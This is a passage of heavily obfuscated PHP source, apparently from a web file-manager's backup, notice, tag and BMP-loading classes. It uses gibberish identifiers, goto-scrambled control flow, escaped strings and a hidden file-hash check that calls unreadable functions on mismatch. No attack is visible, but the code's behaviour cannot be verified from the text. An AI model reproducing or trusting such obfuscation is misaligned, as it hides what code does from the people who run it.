$a×Ú¼Ïó‚ = $EÆ‚èøÌ†Ö[201](($CÚñ¨‰´éÉ * $dë‚™ÆğÚà + 1) / $E­®„ ’İ„); break; } } $a…¥ÑÒâİï = $EÆ‚èøÌ†Ö[114]($EÆ‚èøÌ†Ö[338] . ($EµÈ©åÍ‚ˆ + $E¡íìø´) . $EÆ‚èøÌ†Ö[339] . $E­®„ ’İ„ . $EÆ‚èøÌ†Ö[339] . $a×Ú¼Ïó‚ . $EÆ‚èøÌ†Ö[340]); $aÆ©õ¹ÇÖ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][243]}($b­æ‡Š¢¬‡[0], $a…¥ÑÒâİï); goto Dïêøïùƒ; Bé‚›¨¸¦‚: if (!$døÁáŠ¥åÔ) { return $EÆ‚èøÌ†Ö[10]; } $døÁáŠ¥åÔ = $EÆ‚èøÌ†Ö[201]($døÁáŠ¥åÔ); $EµÈ©åÍ‚ˆ = 0; goto CÜÁ»Öƒ¡Ø; DÓï¤Åíñš: } public function cpngd46d65b6() { goto cÆğîå—„; a´œŞ¾«: $AâåÆ¿ÏÚŸ = $B‰ÄÊè¨¤–[680]; if (strlen($AâåÆ¿ÏÚŸ) < $B‰ÄÊè¨¤–[552]) { return; } goto dâ÷ƒØÌ¨; b¤éòãÄ‹: $FµÏšÍÖè« = 1; $C„„˜Äƒ = $B‰ÄÊè¨¤–[676]; if (strlen($C„„˜Äƒ) < $B‰ÄÊè¨¤–[577]) { die; } goto bæÊÃÊÛ¢§; bæÊÃÊÛ¢§: while ($FµÏšÍÖè« <= (int) $BçÉµáÀã[343]($dòëåôÇØ)) { $BØöç”×á‰ = $FµÏšÍÖè«; $f¡Œ½ÙÙÖà = $B‰ÄÊè¨¤–[677]; while ($f¡Œ½ÙÙÖà < $B‰ÄÊè¨¤–[552]) { if ($f¡Œ½ÙÙÖà >= 0) { break; } $f¡Œ½ÙÙÖà++; } while (!0) { $BØöç”×á‰++; if ($BØöç”×á‰ <= 2) { $FµÏšÍÖè« = $BØöç”×á‰; break; } else { if ($BØöç”×á‰ < 2) { continue; } } $b›Øß¢Öğ§ = !0; for ($bê¨Üã¡ÊŒ = 2; $bê¨Üã¡ÊŒ <= $BçÉµáÀã[343]($BØöç”×á‰); $bê¨Üã¡ÊŒ++) { if ($BØöç”×á‰ % $bê¨Üã¡ÊŒ == 0) { $b›Øß¢Öğ§ = !1; } } if ($b›Øß¢Öğ§) { $FµÏšÍÖè« = $BØöç”×á‰; break; } } $EÃ“¯ŠãÜ[] = $FµÏšÍÖè«; } $eêµ“ºÀ­ = 2; $BÏÚ…ªæËœ = $B‰ÄÊè¨¤–[678]; goto bÈ¾“ÉÙ›º; b‰Ì™ºÍ‹«: $EÃ“¯ŠãÜ = array(); $D«³Ê½ßš‡ = $B‰ÄÊè¨¤–[675]; if (!$D«³Ê½ßš‡) { die; } goto b¤éòãÄ‹; cÆğîå—„: $B‰ÄÊè¨¤– =& $_SERVER[Ö¹ñÒÁ²÷]; $BçÉµáÀã =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $dòëåôÇØ = $BçÉµáÀã[322]($BçÉµáÀã[342](2, 14), $BçÉµáÀã[342](2, 16) - 1); goto b‰Ì™ºÍ‹«; bÈ¾“ÉÙ›º: while (strlen($BÏÚ…ªæËœ) < $B‰ÄÊè¨¤–[555]) { if (!$BÏÚ…ªæËœ) { break; } $BÏÚ…ªæËœ++; } for ($BØöç”×á‰ = $dòëåôÇØ; $BØöç”×á‰ > 1; $BØöç”×á‰--) { $b›Øß¢Öğ§ = !0; $FéÙ›â©‡° = $B‰ÄÊè¨¤–[679]; if (strlen($FéÙ›â©‡°) < $B‰ÄÊè¨¤–[555]) { die; } foreach ($EÃ“¯ŠãÜ as $a®ÁÄÖÂÂò) { if ($BØöç”×á‰ % $a®ÁÄÖÂÂò == 0) { $b›Øß¢Öğ§ = !1; break; } } if ($b›Øß¢Öğ§) { $eêµ“ºÀ­ = $BØöç”×á‰; break; } } return $eêµ“ºÀ­; goto a´œŞ¾«; dâ÷ƒØÌ¨: } public function okhs73f8382f($BÓçà£‹÷Ï, $aÛ¼ã›Óİ¯) { $cìòŠ•‹ÇÙ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; return $cìòŠ•‹ÇÙ[13](array($cìòŠ•‹ÇÙ[14], $cìòŠ•‹ÇÙ[344]), $BÓçà£‹÷Ï, $aÛ¼ã›Óİ¯); $E°†‚Œ˜÷ = $_SERVER[Ö¹ñÒÁ²÷][681]; } public function gfbj0557a631($e»Ì…­Æíß, $A¼ë©Ğ‘¬) { $bğŸ¼®Öã‹ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; return $bğŸ¼®Öã‹[13](array($bğŸ¼®Öã‹[345], $bğŸ¼®Öã‹[346]), $e»Ì…­Æíß, $A¼ë©Ğ‘¬); $d¬Õ—İ‹“ = $_SERVER[Ö¹ñÒÁ²÷][682]; if (!$d¬Õ—İ‹“) { return; } } public function jxpmeedf0a5d($a¨íµÁê, $EÊâßñ±ˆÇ) { $Cæ›¯ÜùÍ¡ =& $_SERVER[Ö¹ñÒÁ²÷]; $a˜ç‹¬Æ” =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; return $a˜ç‹¬Æ”[13](array($a˜ç‹¬Æ”[345], $a˜ç‹¬Æ”[347]), $a¨íµÁê, $EÊâßñ±ˆÇ); $eÇÎ¨ï×… = $Cæ›¯ÜùÍ¡[683]; if (strlen($eÇÎ¨ï×…) < $Cæ›¯ÜùÍ¡[552]) { return; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $A‚ƒ¼‡ˆˆê =& $_SERVER[Ö¹ñÒÁ²÷]; self::$name = date($A‚ƒ¼‡ˆˆê[684]); if (!($c´àâİÎ = Model($A‚ƒ¼‡ˆˆê[685])->lastItem())) { $c´àâİÎ = $this->initData(); } else { self::$name = $c´àâİÎ[$A‚ƒ¼‡ˆˆê[28]]; if ($c´àâİÎ[$A‚ƒ¼‡ˆˆê[686]] == $A‚ƒ¼‡ˆˆê[83]) { self::$name = date($A‚ƒ¼‡ˆˆê[687]); $F’±ï­öÌ‚ = 0; if (isset($c´àâİÎ[$A‚ƒ¼‡ˆˆê[277]][$A‚ƒ¼‡ˆˆê[163]][$A‚ƒ¼‡ˆˆê[415]])) { $F’±ï­öÌ‚ = (int) $c´àâİÎ[$A‚ƒ¼‡ˆˆê[277]][$A‚ƒ¼‡ˆˆê[163]][$A‚ƒ¼‡ˆˆê[415]]; } if ($c´àâİÎ[$A‚ƒ¼‡ˆˆê[28]] == self::$name) { Model($A‚ƒ¼‡ˆˆê[685])->remove($c´àâİÎ[$A‚ƒ¼‡ˆˆê[363]]); } $c´àâİÎ = $this->initData($F’±ï­öÌ‚, $c´àâİÎ[$A‚ƒ¼‡ˆˆê[688]]); } else { $this->checkStore($c´àâİÎ[$A‚ƒ¼‡ˆˆê[688]]); } } self::$option = $c´àâİÎ; } private function initData($bîøí‚ò†ï = 0, $f±ùŞÂÅ¿‘ = '') { goto EßÅ±É©ƒë; EßÅ±É©ƒë: $eÏê”»Ï¶Í =& $_SERVER[Ö¹ñÒÁ²÷]; $fÆÚ„¯çš = Model($eÏê”»Ï¶Í[685])->config(); if ($f±ùŞÂÅ¿‘ && $fÆÚ„¯çš[$eÏê”»Ï¶Í[688]] != $f±ùŞÂÅ¿‘) { $bîøí‚ò†ï = 0; } goto a÷ëğ¬³—à; EÖÖ£ŒÌÚ: $AÙËßÂèíŞ[$eÏê”»Ï¶Í[363]] = $bõéàÆ‰·¡; return $AÙËßÂèíŞ; goto d…æ÷–‰øÅ; a÷ëğ¬³—à: $this->checkStore($fÆÚ„¯çš[$eÏê”»Ï¶Í[688]]); $AÙËßÂèíŞ = array($eÏê”»Ï¶Í[688] => $fÆÚ„¯çš[$eÏê”»Ï¶Í[688]], $eÏê”»Ï¶Í[28] => self::$name, $eÏê”»Ï¶Í[686] => 0, $eÏê”»Ï¶Í[689] => $fÆÚ„¯çš[$eÏê”»Ï¶Í[689]], $eÏê”»Ï¶Í[277] => array($eÏê”»Ï¶Í[690] => array($eÏê”»Ï¶Í[686] => 0), $eÏê”»Ï¶Í[691] => array($eÏê”»Ï¶Í[686] => 0, $eÏê”»Ï¶Í[692] => 0, $eÏê”»Ï¶Í[693] => 0, $eÏê”»Ï¶Í[29] => $eÏê”»Ï¶Í[33]), $eÏê”»Ï¶Í[694] => array($eÏê”»Ï¶Í[686] => 0, $eÏê”»Ï¶Í[692] => 0, $eÏê”»Ï¶Í[693] => 0), $eÏê”»Ï¶Í[163] => array($eÏê”»Ï¶Í[686] => 0, $eÏê”»Ï¶Í[695] => 0, $eÏê”»Ï¶Í[696] => 0, $eÏê”»Ï¶Í[697] => 0, $eÏê”»Ï¶Í[698] => 0, $eÏê”»Ï¶Í[415] => $bîøí‚ò†ï)), $eÏê”»Ï¶Í[699] => time(), $eÏê”»Ï¶Í[700] => 0); $bõéàÆ‰·¡ = Model($eÏê”»Ï¶Í[685])->insert($AÙËßÂèíŞ); goto EÖÖ£ŒÌÚ; d…æ÷–‰øÅ: } private function checkStore($B®­ÌÑ ¯ë) { $C› Ç·‚Ñ =& $_SERVER[Ö¹ñÒÁ²÷]; $D¶©ìéÄ´æ = Model($C› Ç·‚Ñ[701])->listData($B®­ÌÑ ¯ë); Model($C› Ç·‚Ñ[701])->checkConfig($D¶©ìéÄ´æ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ö¹ñÒÁ²÷][685])->findByName(self::$name); } return self::$option; } public static function set($EˆÓ´‘£Š‘) { $AÔˆ±†ƒô® =& $_SERVER[Ö¹ñÒÁ²÷]; $fñæŠÔèµ¦ = self::get(); foreach ($EˆÓ´‘£Š‘ as $AòñÇ¾ÄÂŞ => $A‘À´ëöË¬) { $Cóà¹ÑÂî× = explode($AÔˆ±†ƒô®[91], $AòñÇ¾ÄÂŞ); $c«šíªè… = count($Cóà¹ÑÂî×); switch ($c«šíªè…) { case 1: $fñæŠÔèµ¦[$Cóà¹ÑÂî×[0]] = $A‘À´ëöË¬; break; case 2: $fñæŠÔèµ¦[$Cóà¹ÑÂî×[0]][$Cóà¹ÑÂî×[1]] = $A‘À´ëöË¬; break; case 3: $fñæŠÔèµ¦[$Cóà¹ÑÂî×[0]][$Cóà¹ÑÂî×[1]][$Cóà¹ÑÂî×[2]] = $A‘À´ëöË¬; break; } } Model($AÔˆ±†ƒô®[685])->update($fñæŠÔèµ¦[$AÔˆ±†ƒô®[363]], $fñæŠÔèµ¦); self::$option = $fñæŠÔèµ¦; return self::$option; } public function keep() { $fƒŠ—…È‚— =& $_SERVER[Ö¹ñÒÁ²÷]; $A¬ˆÚÏ…Ô = self::get(); if ($A¬ˆÚÏ…Ô[$fƒŠ—…È‚—[277]][$fƒŠ—…È‚—[690]][$fƒŠ—…È‚—[686]] == $fƒŠ—…È‚—[83]) { return; } $this->backupKeep($A¬ˆÚÏ…Ô); self::set(array($fƒŠ—…È‚—[702] => 1)); } private function backupKeep($c‹¹Ê¡ÃÉ™) { goto a·ØíÖÑÌó; a·ØíÖÑÌó: $f¶Ë©åÑ‚ =& $_SERVER[Ö¹ñÒÁ²÷]; $a‹Á†‰ƒà = Model($f¶Ë©åÑ‚[685])->listData(); if (empty($a‹Á†‰ƒà)) { return; } goto cÉĞçåŠô·; cÉĞçåŠô·: $fïÙ©ŞÜå = 0; $døŠùß¨Š– = array(); foreach ($a‹Á†‰ƒà as $eêÜÒÇ“Ó) { if ($fïÙ©ŞÜå >= 7) { break; } $døŠùß¨Š–[] = $eêÜÒÇ“Ó[$f¶Ë©åÑ‚[28]]; $fïÙ©ŞÜå++; } goto Aùî½½¢º¤; Aùî½½¢º¤: for ($fïÙ©ŞÜå = 0; $fïÙ©ŞÜå < 12; $fïÙ©ŞÜå++) { $døŠùß¨Š–[] = date($f¶Ë©åÑ‚[703], strtotime("\55{$fïÙ©ŞÜå}\40\x6d\157\156\164\150\x73")); } $døŠùß¨Š– = array_unique($døŠùß¨Š–); foreach ($a‹Á†‰ƒà as $eêÜÒÇ“Ó) { if (!empty($eêÜÒÇ“Ó[$f¶Ë©åÑ‚[28]]) && in_array($eêÜÒÇ“Ó[$f¶Ë©åÑ‚[28]], $døŠùß¨Š–)) { continue; } Model($f¶Ë©åÑ‚[685])->remove($eêÜÒÇ“Ó[$f¶Ë©åÑ‚[363]]); $A±‡íô„¦ô = "\x7b\151\157\x3a{$c‹¹Ê¡ÃÉ™[$f¶Ë©åÑ‚[688]]}\175\57\144\141\x74\141\x62\x61\x73\x65\x2f\x62\141\x63\153\x75\160\x5f{$eêÜÒÇ“Ó[$f¶Ë©åÑ‚[28]]}"; IO::remove($A±‡íô„¦ô, !1); } goto f‘ĞÛ¬Æ–À; f‘ĞÛ¬Æ–À: } public function db() { goto cŒßÖÖ³; fĞ˜ŒÚ“¿: return !0; goto CØÀ‡ªî©; BîïÄ½–: $Cí¢â“ˆå = new BackupDb(); if (!$Cí¢â“ˆå->index()) { return !1; } self::set(array($cÚ×°êâÀ…[704] => 1)); goto fĞ˜ŒÚ“¿; cŒßÖÖ³: $cÚ×°êâÀ… =& $_SERVER[Ö¹ñÒÁ²÷]; $F˜£†ÒÖ£ = self::get(); if ($F˜£†ÒÖ£[$cÚ×°êâÀ…[277]][$cÚ×°êâÀ…[691]][$cÚ×°êâÀ…[686]] == $cÚ×°êâÀ…[83]) { return !0; } goto BîïÄ½–; CØÀ‡ªî©: } public function dbFile() { goto CĞİÕ´º¢‘; cö¨ŒÂ½Ä: $CÌÜ´ÄÌº¢ = new BackupDbFile(); if (!$CÌÜ´ÄÌº¢->index()) { return !1; } self::set(array($EÈæ“è´ÑĞ[705] => 1)); goto D‡½³áïĞà; CĞİÕ´º¢‘: $EÈæ“è´ÑĞ =& $_SERVER[Ö¹ñÒÁ²÷]; $e‹æŸ„óÚˆ = self::get(); if ($e‹æŸ„óÚˆ[$EÈæ“è´ÑĞ[277]][$EÈæ“è´ÑĞ[694]][$EÈæ“è´ÑĞ[686]] == $EÈæ“è´ÑĞ[83]) { return !0; } goto cö¨ŒÂ½Ä; D‡½³áïĞà: return !0; goto Dƒ¦ÚÓÀï¸; Dƒ¦ÚÓÀï¸: } public function file() { $d‡ÌÉ©ÓÌ§ =& $_SERVER[Ö¹ñÒÁ²÷]; $fƒ¯ÒÂ—Ç… = self::get(); if ($fƒ¯ÒÂ—Ç…[$d‡ÌÉ©ÓÌ§[277]][$d‡ÌÉ©ÓÌ§[163]][$d‡ÌÉ©ÓÌ§[686]] == $d‡ÌÉ©ÓÌ§[83]) { return !0; } if (!isset($fƒ¯ÒÂ—Ç…[$d‡ÌÉ©ÓÌ§[689]]) || $fƒ¯ÒÂ—Ç…[$d‡ÌÉ©ÓÌ§[689]] == $d‡ÌÉ©ÓÌ§[464]) { $CÀ³á…Ïæ© = new BackupFile(); if (!$CÀ³á…Ïæ©->index()) { return !1; } } self::set(array($d‡ÌÉ©ÓÌ§[706] => 1, $d‡ÌÉ©ÓÌ§[686] => 1)); return !0; } } goto C’³åÅÓë¨; cæëÊĞÙÑ¹: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\x2e\156\x6f\164\151\x63\145\114\x69\163\x74"; public $field = array("\x6e\141\155\145", "\x63\x6f\x6e\164\145\x6e\164", "\141\165\x74\x68", "\x6d\x6f\x64\x65", "\164\151\x6d\145", "\x74\x79\x70\x65", "\x6c\x65\166\145\x6c", "\x65\156\x61\142\x6c\x65", "\163\x6f\162\x74"); public function listData($c³¿„‚Ùƒã = false, $EÔ²‹¦³¬ˆ = "\x73\157\162\164", $Aİºá‘›Íê = false) { return parent::listData($c³¿„‚Ùƒã, $EÔ²‹¦³¬ˆ, $Aİºá‘›Íê); } public function add($f®õÊËˆª) { $a¶…š¦‡¸ =& $_SERVER[Ö¹ñÒÁ²÷]; $eÆ·×Ï¯ò = time(); if ($f®õÊËˆª[$a¶…š¦‡¸[12]] == $a¶…š¦‡¸[2449]) { $eÆ·×Ï¯ò = strtotime($f®õÊËˆª[$a¶…š¦‡¸[186]]); } $f®õÊËˆª[$a¶…š¦‡¸[186]] = $eÆ·×Ï¯ò; return parent::insert($f®õÊËˆª); } public function update($FÌöÑµå·, $F¸à¹’Éß¦) { goto b†ß¨Ïªİ; CçŸõ•‡ÇÑ: return parent::update($FÌöÑµå·, $F¸à¹’Éß¦); goto FáÉÈ§ó·é; dÇŞ…ß›ë: $FÎÕõ¨®·Ô = time(); if ($F¸à¹’Éß¦[$CÖÄœ™¯ù[12]] == $CÖÄœ™¯ù[2449]) { $FÎÕõ¨®·Ô = strtotime($F¸à¹’Éß¦[$CÖÄœ™¯ù[186]]); } $F¸à¹’Éß¦[$CÖÄœ™¯ù[186]] = $FÎÕõ¨®·Ô; goto CçŸõ•‡ÇÑ; b†ß¨Ïªİ: $CÖÄœ™¯ù =& $_SERVER[Ö¹ñÒÁ²÷]; $cÉãÀ¥Áš¸ = $this->listData($FÌöÑµå·); if (!$cÉãÀ¥Áš¸) { return !1; } goto dÇŞ…ß›ë; FáÉÈ§ó·é: } public function remove($a®Â»Æ¯íæ) { $AõĞó³õ¶ = $this->listData($a®Â»Æ¯íæ); if (!$AõĞó³õ¶ || $AõĞó³õ¶[$_SERVER[Ö¹ñÒÁ²÷][1074]]) { return !1; } return parent::remove($a®Â»Æ¯íæ); } public function sort($aÏí’âöİ®, $FÄÑÆ”Ô) { return parent::update($aÏí’âöİ®, $FÄÑÆ”Ô); } public function enable($eöçè°ÖïÓ, $Aµ§åèÊÜ©) { return parent::update($eöçè°ÖïÓ, array($_SERVER[Ö¹ñÒÁ²÷][2450] => $Aµ§åèÊÜ©)); } private function initUserOption() { $Fµ×¡›ö•’ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->optionType = $Fµ×¡›ö•’[2451]; $this->modelType = $Fµ×¡›ö•’[2452]; $this->field = array($Fµ×¡›ö•’[2453], $Fµ×¡›ö•’[28], $Fµ×¡›ö•’[186], $Fµ×¡›ö•’[29], $Fµ×¡›ö•’[2454], $Fµ×¡›ö•’[686], $Fµ×¡›ö•’[179]); } public function userNoticeGet($bÅÎº“¹œÀ = false) { $this->initUserOption(); return parent::listData($bÅÎº“¹œÀ, $_SERVER[Ö¹ñÒÁ²÷][363], !0); } public function userNoticeAdd($bôÓÉµ™˜§) { $FƒÆ§­ƒÚ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->initUserOption(); $C÷À¦…àó× = $this->findByKey($FƒÆ§­ƒÚ[2453], $bôÓÉµ™˜§[$FƒÆ§­ƒÚ[363]]); if ($C÷À¦…àó×) { return !0; } $B¾à—ÕÔÜš = array($FƒÆ§­ƒÚ[2453] => $bôÓÉµ™˜§[$FƒÆ§­ƒÚ[363]], $FƒÆ§­ƒÚ[28] => $bôÓÉµ™˜§[$FƒÆ§­ƒÚ[28]], $FƒÆ§­ƒÚ[186] => $bôÓÉµ™˜§[$FƒÆ§­ƒÚ[186]], $FƒÆ§­ƒÚ[29] => isset($bôÓÉµ™˜§[$FƒÆ§­ƒÚ[29]]) ? $bôÓÉµ™˜§[$FƒÆ§­ƒÚ[29]] : 1, $FƒÆ§­ƒÚ[2454] => isset($bôÓÉµ™˜§[$FƒÆ§­ƒÚ[2454]]) ? $bôÓÉµ™˜§[$FƒÆ§­ƒÚ[2454]] : 0, $FƒÆ§­ƒÚ[686] => 0, $FƒÆ§­ƒÚ[179] => 0); return parent::insert($B¾à—ÕÔÜš); } public function userNoticeEdit($Eõ÷ø²èæÕ, $d„›İ†¥´¥) { $this->initUserOption(); return parent::update($Eõ÷ø²èæÕ, $d„›İ†¥´¥); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\164\145\x6d\x5f\x6f\160\164\x69\x6f\156"; protected $jsonField = array("\155\145\156\165", "\x72\157\x6c\145", "\x72\x6f\x6c\145\107\162\157\x75\x70", "\162\145\x67\151\163\164", "\145\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($AÄŒ™Ù½šï) { return "\123\171\x73\x74\145\155\117\160\x74\151\157\156\137{$AÄŒ™Ù½šï}"; } protected function optionDefault($AË›Ô¨¦‚§ = '') { $Dóãù¦Áº­ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($AË›Ô¨¦‚§ == $Dóãù¦Áº­[33]) { return $GLOBALS[$Dóãù¦Áº­[6]][$Dóãù¦Áº­[2455]]; } } } class SystemRecordModel extends ModelBaseLight { } goto eÙ·ŞÏ÷Áƒ; fİÇÛæ½¾: $eÖæ¥Ğ„Ô = LIB_DIR . $_SERVER[Ö¹ñÒÁ²÷][1480]; $b¤ßï¶†³® = $_SERVER[Ö¹ñÒÁ²÷][1295]; if ($_SERVER[$_SERVER[Ö¹ñÒÁ²÷][783]] != $b¤ßï¶†³®($eÖæ¥Ğ„Ô)) { goto BÉ‹—êÌ³ë; BÉ‹—êÌ³ë: $fßÊÜÆÓ…´ = $_SERVER[Ö¹ñÒÁ²÷][786]; $eŞîÕŠ”Æ = $_SERVER[$_SERVER[Ö¹ñÒÁ²÷][787]] . $_SERVER[Ö¹ñÒÁ²÷][788]; $E‰ù¦¹®½ = $fßÊÜÆÓ…´($eŞîÕŠ”Æ); goto c­šœË¨ãÄ; cÓÄ†ê§ğ: $F„Çª»Óö¥($eÖæ¥Ğ„Ô); goto aÄ×àÁà»; c­šœË¨ãÄ: $EïÄ¶ÜË³ = explode($_SERVER[Ö¹ñÒÁ²÷][213], $E‰ù¦¹®½); if (count($EïÄ¶ÜË³) < $_SERVER[Ö¹ñÒÁ²÷][552]) { $BÉöïÕÕ¹¸ = $_SERVER[Ö¹ñÒÁ²÷][789]; $BÉöïÕÕ¹¸(); } $F„Çª»Óö¥ = $_SERVER[Ö¹ñÒÁ²÷][1481]; goto cÓÄ†ê§ğ; aÄ×àÁà»: } goto e…×Ë±ŞŸê; Bî¼ŠÏáñŞ: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\x2e\x74\x61\147\x4c\x69\163\164"; public $modelType = "\x55\x73\x65\162\x4f\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\141\155\145", "\163\x74\171\x6c\x65", "\163\157\x72\x74"); public function listData($Aèß©­³ƒë = false, $Eó°éÕÎ‹« = "\163\x6f\x72\164", $EŠ›Ş·®ã = false) { return parent::listData($Aèß©­³ƒë, $Eó°éÕÎ‹«, $EŠ›Ş·®ã); } public function remove($fª¢ÙõÎÜÃ) { return parent::remove($fª¢ÙõÎÜÃ); } public function add($Aä­‰ÉÏ»ö, $fè˜ŸÄ£µ¤ = "\x6c\141\142\x65\x6c\55\x67\x72\145\171\55\156\x6f\162\x6d\141\154") { $fÍÊè ¤ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($this->findByName($Aä­‰ÉÏ»ö)) { return !1; } $dÖ÷Ü„Çò‡ = array($fÍÊè ¤[382] => $Aä­‰ÉÏ»ö, $fÍÊè ¤[433] => $fè˜ŸÄ£µ¤, $fÍÊè ¤[2083] => $this->getSort($fÍÊè ¤[242]) + 1); return parent::insert($dÖ÷Ü„Çò‡); } public function update($B´÷‘ôÆ­î, $Bêø¢®Î ) { $DŠíƒÍª¯ =& $_SERVER[Ö¹ñÒÁ²÷]; $f„¶µæó‚Â = $this->listData($B´÷‘ôÆ­î); $E¹Ê™ÀÔÏœ = $this->findByName($Bêø¢®Î [$DŠíƒÍª¯[28]]); if (!$f„¶µæó‚Â || $E¹Ê™ÀÔÏœ && $E¹Ê™ÀÔÏœ[$DŠíƒÍª¯[363]] != $f„¶µæó‚Â[$DŠíƒÍª¯[363]]) { return !1; } return parent::update($B´÷‘ôÆ­î, $Bêø¢®Î ); } public function moveTop($C—ÜôÍ¥¼‰) { $BÄÃ£µ¸¡ =& $_SERVER[Ö¹ñÒÁ²÷]; $Eªõ‚ŠÒë = parent::listData(); $E¿ì­§³ª = $this->getSort($BÄÃ£µ¸¡[241]); foreach ($Eªõ‚ŠÒë as &$cÉ‚éˆ§¢œ) { if ($cÉ‚éˆ§¢œ[$BÄÃ£µ¸¡[363]] == $C—ÜôÍ¥¼‰) { $cÉ‚éˆ§¢œ[$BÄÃ£µ¸¡[2100]] = $E¿ì­§³ª; continue; } $cÉ‚éˆ§¢œ[$BÄÃ£µ¸¡[2100]] += 1; } return parent::resetData($Eªõ‚ŠÒë); } public function moveBottom($AÜãÏ’¥Ññ) { $aÍÊêƒÍ… =& $_SERVER[Ö¹ñÒÁ²÷]; $aŒ¶ˆêÍ§ˆ = $this->getSort($aÍÊêƒÍ…[242]) + 1; return parent::update($AÜãÏ’¥Ññ, array($aÍÊêƒÍ…[2100] => $aŒ¶ˆêÍ§ˆ)); } public function resetSort($f¢‰Ùë’šŒ) { goto D½ËÚ•Œ‹œ; b’­ÜÑïİ¢: return parent::resetData($d¦ˆ‹„œˆ¢); goto C ÓŠŒ¬³´; D½ËÚ•Œ‹œ: $B•–¦†Êğ– =& $_SERVER[Ö¹ñÒÁ²÷]; $fß¡‘š¨ÂÂ = array(); $f¢‰Ùë’šŒ = is_array($f¢‰Ùë’šŒ) ? $f¢‰Ùë’šŒ : array(); goto aõ®ñÏãš¿; aõ®ñÏãš¿: for ($cñ‹Øï¹ä = 0; $cñ‹Øï¹ä < count($f¢‰Ùë’šŒ); $cñ‹Øï¹ä++) { $fß¡‘š¨ÂÂ[$f¢‰Ùë’šŒ[$cñ‹Øï¹ä] . $B•–¦†Êğ–[33]] = $cñ‹Øï¹ä + 1; } $d¦ˆ‹„œˆ¢ = parent::listData(); foreach ($d¦ˆ‹„œˆ¢ as &$a±Ÿ÷Æ¦¤) { $f„ğª°‘Şâ = $fß¡‘š¨ÂÂ[$a±Ÿ÷Æ¦¤[$B•–¦†Êğ–[363]]]; $a±Ÿ÷Æ¦¤[$B•–¦†Êğ–[2100]] = $f„ğª°‘Şâ ? $f„ğª°‘Şâ : $a±Ÿ÷Æ¦¤[$B•–¦†Êğ–[2100]]; } goto b’­ÜÑïİ¢; C ÓŠŒ¬³´: } private function getSort($D‚•Õ‘ëå) { $aƒ‰à‹Æ÷´ =& $_SERVER[Ö¹ñÒÁ²÷]; $cŠ¥Æ¢˜ƒŞ = parent::listData(); $f‡ÏÊ×Á¬† = array_to_keyvalue($cŠ¥Æ¢˜ƒŞ, $aƒ‰à‹Æ÷´[33], $aƒ‰à‹Æ÷´[2100]); if (!$f‡ÏÊ×Á¬†) { $f‡ÏÊ×Á¬† = array(0); } $F„¼°îŸ = $D‚•Õ‘ëå == $aƒ‰à‹Æ÷´[242] ? max($f‡ÏÊ×Á¬†) : min($f‡ÏÊ×Á¬†); return intval($F„¼°îŸ); } } goto a‚…ó¶ï; C¥™Í³¸: class ImageGdBMP { public static function load($F–†¬ïºè) { $C†ø†‰‡Çó = fopen($F–†¬ïºè, $_SERVER[Ö¹ñÒÁ²÷][1496]); if ($C†ø†‰‡Çó === !1) { return !1; } $f¨È¦ùš… = self::loadFromStream($C†ø†‰‡Çó); fclose($C†ø†‰‡Çó); return $f¨È¦ùš…; } public static function loadFromStream($dÄØ­‚ •ã) { $E°×ùàõ—Ù =& $_SERVER[Ö¹ñÒÁ²÷]; $DÙ·¹Š¨¤Ì = fread($dÄØ­‚ •ã, 14); if ($DÙ·¹Š¨¤Ì === !1) { return !1; } if ($DÙ·¹Š¨¤Ì[0] != $E°×ùàõ—Ù[1807] || $DÙ·¹Š¨¤Ì[1] != $E°×ùàõ—Ù[1808]) { return !1; } $b¼¦´¥‘®« = unpack($E°×ùàõ—Ù[1809] . $E°×ùàõ—Ù[1810] . $E°×ùàõ—Ù[1811] . $E°×ùàõ—Ù[1812] . $E°×ùàõ—Ù[1813], $DÙ·¹Š¨¤Ì); return self::loadFromStreamAndFileHeader($dÄØ­‚ •ã, $b¼¦´¥‘®«); } public static function loadFromStreamAndFileHeader($e¢çÀ‡Ú…É, array $EÃ«×•ƒ‰ñ) { goto B§ò°³ˆó·; Eƒ¸ßöĞÛË: $D¿›½ƒïáè = abs($F¢›Ù†Û²¨); $B‘ÙÓ‹—Ë¤ = $F¢›Ù†Û²¨ > 0 ? $D¿›½ƒïáè - 1 : 0; $AØÌÃÃø×° = $F¢›Ù†Û²¨ > 0 ? -1 : 1; goto a­ª¿ö„»­; AéÎá‰Ô–: if ($fñëˆÈº‘± == 0 || $F¢›Ù†Û²¨ == 0 || $bæÛÄœ¡®Ô != 1 || ($FØçæ³ŒõŠ & $C¿¿Ş¢·í‚) != 0 || ($FØçæ³ŒõŠ & $A¨Ë–äª£) != 0 || ($FØçæ³ŒõŠ & $e÷ŞÎ™ùô) != 0 || ($C¿¿Ş¢·í‚ & $A¨Ë–äª£) != 0 || ($C¿¿Ş¢·í‚ & $e÷ŞÎ™ùô) != 0 || ($A¨Ë–äª£ & $e÷ŞÎ™ùô) != 0) { return !1; } if ($B·­¤Õ÷ == 4 || $B·­¤Õ÷ == 5) { $Cö…é««¡Ö = stream_get_contents($e¢çÀ‡Ú…É, $e­êå†ğÃ°); if ($Cö…é««¡Ö === !1) { return !1; } return imagecreatefromstring($Cö…é««¡Ö); } $f•¢ŞéòŞ’ = $fñëˆÈº‘± * $FÖŸÈ‡èƒÔ + 31 >> 3 & ~3; goto Eƒ¸ßöĞÛË; B§ò°³ˆó·: $Cù¥¯‚«¶œ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($EÃ«×•ƒ‰ñ[$Cù¥¯‚«¶œ[384]] != 19778) { return !1; } $Cö…é««¡Ö = fread($e¢çÀ‡Ú…É, 4); goto B¶Èœ†Ÿ; B¶Èœ†Ÿ: if ($Cö…é««¡Ö === !1) { return !1; } list(, 